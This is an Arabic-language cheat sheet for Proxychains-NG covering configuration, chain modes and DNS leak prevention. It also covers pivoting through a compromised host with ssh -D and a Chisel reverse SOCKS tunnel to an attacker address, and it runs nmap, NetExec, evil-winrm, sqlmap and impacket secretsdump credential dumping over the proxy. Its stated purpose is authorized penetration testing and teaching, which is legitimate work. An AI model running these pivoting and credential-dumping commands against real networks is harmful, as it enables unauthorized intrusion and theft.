<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⛓️ Proxychains - ورقة الغش الكاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗ ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝
  ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ ██║     ███████║███████║██║██╔██╗ ██║███████╗
  ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  ██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║
  ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   ╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
       Force Any TCP Connection Through SOCKS4, SOCKS5, and HTTP Proxies
```
<p align="center">
  <img src="https://img.shields.io/badge/Proxychains-Proxychains--NG-blue?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunneling-orange?style=for-the-badge" alt="التمحور وحفر الأنفاق">
  <img src="https://img.shields.io/badge/Protocols-SOCKS4_SOCKS5_HTTP-green?style=for-the-badge" alt="البروتوكولات">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
</ص>

<p align="center">
  <b>🌐 قم بتوجيه أدوات شبكة Linux CLI القياسية ديناميكيًا من خلال SOCKS متعددة القفزات ووكلاء HTTP عبر LD_PRELOAD</b>
</ص>

---

## 📋 جدول المحتويات

- [نظرة عامة وكيفية عمل سلاسل الوكلاء](#-نظرة عامة--كيف تعمل سلاسل الوكلاء)
- [التثبيت](#-التثبيت)
- [ملفات التكوين والتسلسل الهرمي للبحث](#-ملفات التكوين--التسلسل الهرمي للبحث)
- [شرح أوضاع التسلسل](#-شرح أوضاع التسلسل)
  - [`dynamic_chain` (مستحسن)](#dynamic_chain-recommulated)
  - [`strict_chain`](#strict_chain)
  - [`round_robin_chain`](#round_robin_chain)
  - [`random_chain`](#random_chain)
- [منع تسرب DNS (`proxy_dns`)](#-dns-leaks-prevention-proxy_dns)
- [تكوين قوائم الوكيل](#-configuring-proxy-lists)
- [سير العمل المحوري](#-سير العمل المحوري)
  - [SSH Dynamic SOCKS Proxy (`ssh -D`)](#ssh-dynamic-socks-proxy-ssh--d)
  - [ترحيل الإزميل والجوارب Ligolo-ng](#chisel--ligolo-ng-socks-relay)
- [تكامل الأدوات ومشاكلك](#-تكامل الأدوات--مسكتك)
  - [Nmap مع Proxychains (لماذا يفشل `-sS`)](#nmap-with-proxychains-why--ss-fails)
  - [أدوات الدليل النشط (NetExec، Evil-WinRM، Impacket)](#active-directory-tools-netexec-evil-winrm-impacket)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [الاعتبارات الدفاعية وOPSEC](#-الاعتبارات الدفاعية--opsec)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)

---

## 🎯 نظرة عامة على كيفية عمل سلاسل البروكسي

**Proxychains** (الفرع النشط الحديث: **Proxychains-NG** / `proxychains4`) يسمح بتشغيل أي أمر ديناميكي من خلال وكلاء SOCKS4 أو SOCKS5 أو HTTP(S) الفردي أو المتعدد.

يعمل عن طريق التحميل المسبق لمكتبة ربط مخصصة (`libproxychains4.so`) باستخدام آلية الرابط الديناميكي (`LD_PRELOAD`). يعترض هذا استدعاءات واجهة برمجة التطبيقات (`connect()`، `gethostbyname()`) التي تجريها التطبيقات المستهدفة ويعيد توجيه حركة مرور TCP الخاصة بها إلى سلسلة الوكيل التي تم تكوينها بشفافية.

---

## 📥 التثبيت
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y proxychains4

# Arch Linux
sudo pacman -S proxychains-ng

# macOS (Homebrew)
brew install proxychains-ng
```
---

## ⚙️ ملفات التكوين والتسلسل الهرمي للبحث

يبحث Proxychains عن ملف التكوين الخاص به بالترتيب الصارم التالي للأولوية:

1. تم تعيين المسار في متغير البيئة `PROXYCHAINS_CONF_FILE`.
2. تم تمرير الملف عبر علامة `-f` (`proxychains4 -f ./myproxy.conf <command>`).
3. `./proxychains.conf` في دليل العمل الحالي.
4.`$(HOME)/.proxychains/proxychains.conf`.
5.`/etc/proxychains4.conf` (النظام الافتراضي).

---

## 🔗 شرح أوضاع التسلسل

قم بتحرير `/etc/proxychains4.conf` لاختيار خوارزمية توجيه السلسلة:

### `dynamic_chain` (مستحسن)
يتخطى الوكلاء الميتين في القائمة تلقائيًا دون قطع الاتصال. إذا كان الوكيل رقم 1 في الأعلى، والوكيل رقم 2 معطلاً، والوكيل رقم 3 في الأعلى، فستكون مسارات المرور من خلال 1 -> 3.
```ini
dynamic_chain
# strict_chain
```
### `strict_chain`
يتبع بدقة ترتيب الوكيل الذي تم تكوينه. إذا فشل أي وكيل في السلسلة أو انتهت المهلة، فسيتم رفض الاتصال بالكامل.
```ini
strict_chain
```
### `round_robin_chain`
التنقل عبر قائمة الوكيل بشكل تسلسلي لكل طلب اتصال جديد.
```ini
round_robin_chain
chain_len = 2
```
### `random_chain`
يختار الوكلاء بشكل عشوائي من القائمة حتى `chain_len`.

---

## 🛡️ منع تسرب DNS (`proxy_dns`)

أحد أخطر حالات فشل OPSEC أثناء الاستطلاع الخارجي أو التمحور الداخلي هو تسريب استعلامات DNS إلى مزود خدمة الإنترنت المحلي أو البوابة المستهدفة.

تأكد من أن `proxy_dns` نشط في `/etc/proxychains4.conf`:
```ini
# Proxy all DNS requests through SOCKS5 proxy
proxy_dns

# Suppress annoying hook library stdout logs
quiet_mode
```
---

## 📝 تكوين قوائم الوكيل

في الجزء السفلي من `/etc/proxychains4.conf`، تحت `[ProxyList]`:
```ini
[ProxyList]
# Protocol   IP               Port   [Username]  [Password]
socks5       127.0.0.1        1080
socks4       192.168.1.100    1080
http         10.10.10.50      8080   admin       SecretPass123
```
---

## 🚀 سير العمل المحوري

### وكيل SSH Dynamic SOCKS (`ssh -D`)
```bash
# 1. Open background dynamic SOCKS5 proxy on local port 1080 through compromised pivot host
ssh -f -N -D 127.0.0.1:1080 user@10.10.10.50

# 2. Add entry to /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# 3. Access internal machines unreachable directly from attacker box
proxychains4 curl http://172.16.20.10
```
### مرحل الإزميل والجوارب Ligolo-ng

عند تشغيل أنفاق خادم العميل Chisel:
```bash
# Connect Chisel client with reverse SOCKS
chisel client 10.10.14.5:8000 R:1080:socks

# Route tools through Chisel tunnel
proxychains4 crackmapexec smb 172.16.50.0/24
```
---

## ⚠️ تكامل الأدوات والمشاكل

### Nmap مع Proxychains (لماذا يفشل `-sS`)

> [!تحذير]
> يدعم بروكسي SOCKS جلسات TCP المنشأة فقط. **ستفشل عمليات فحص SYN Stealth (`-sS`) أو ستتعطل** لأنها تتطلب معالجة مأخذ توصيل أولية غير مدعومة عبر SOCKS!
```bash
# Correct Nmap command with Proxychains (Full TCP Connect, No Ping, No DNS)
proxychains4 nmap -sT -Pn -n -sV -p 80,443,445,3389 172.16.20.10

# Scan Top 100 ports over proxy
proxychains4 nmap -sT -Pn -n --top-ports 100 172.16.20.10
```
### أدوات الدليل النشط (NetExec، Evil-WinRM، Impacket)
```bash
# SMB enumeration through internal pivot
proxychains4 nxc smb 172.16.20.10 -u Administrator -p 'Password123'

# WinRM shell through proxychains
proxychains4 evil-winrm -i 172.16.20.10 -u Administrator -p 'Password123'

# Impacket secretsdump over SOCKS proxy
proxychains4 impacket-secretsdump domain.local/Administrator:Pass@172.16.20.10 -no-pass
```
---

## ⚡ جدول مرجعي سريع

| الهدف | الأمر |
|-----------|--------|
| ** تشغيل الأمر عبر الوكيل ** | `proxychains4 <command> [args]` |
| **ملف التكوين المخصص** | `proxychains4 -f ./custom.conf <command>` |
| **التنفيذ الهادئ (بدون لافتة)** | `proxychains4 -q <command>` |
| ** مسح الهدف الداخلي لـ TCP ** | `proxychains4 nmap -sT -Pn -n -p 80,445 <IP>` |
| **طلب ويب داخلي** | `proxychains4 curl -i http://<INTERNAL_IP>` |
| ** اختبار SQLMap الداخلي ** | `proxychains4 sqlmap -u "http://<IP>/id=1" --batch` |
| ** مسبار NetExec الداخلي ** | `proxychains4 nxc smb <SUBNET>/24` |

---

## 🛡️ الاعتبارات الدفاعية وOPSEC

1. **تسريبات DNS:** إذا تم التعليق على `proxy_dns`، فسيقوم نظامك بحل أسماء المضيفين عبر DNS المحلي، وتنبيه الفرق الزرقاء بأسماء المضيفين المستهدفة.
2. **السرعة وزمن الوصول:** يؤدي ربط العديد من الوكلاء إلى زيادة زمن الرحلة ذهابًا وإيابًا (RTT). قم بتعيين مهلات معقولة (`tcp_read_time_out 15000`، `tcp_connect_time_out 8000`).
3. **الثنائيات الثابتة:** تتجاوز الثنائيات المجمعة بشكل ثابت (على سبيل المثال، ثنائيات Go/Rust التي لا تربط `libc.so`) خطافات `LD_PRELOAD` ولن يتم توجيهها عبر Proxychains.

---

## ⚠️إخلاء المسؤولية القانونية

> [!تنبيه]
> ورقة الغش هذه مخصصة لاختبارات الاختراق المعتمدة، وارتباطات الفريق الأحمر، والأبحاث التعليمية فقط. توجيه حركة المرور دون إذن ممنوع منعا باتا.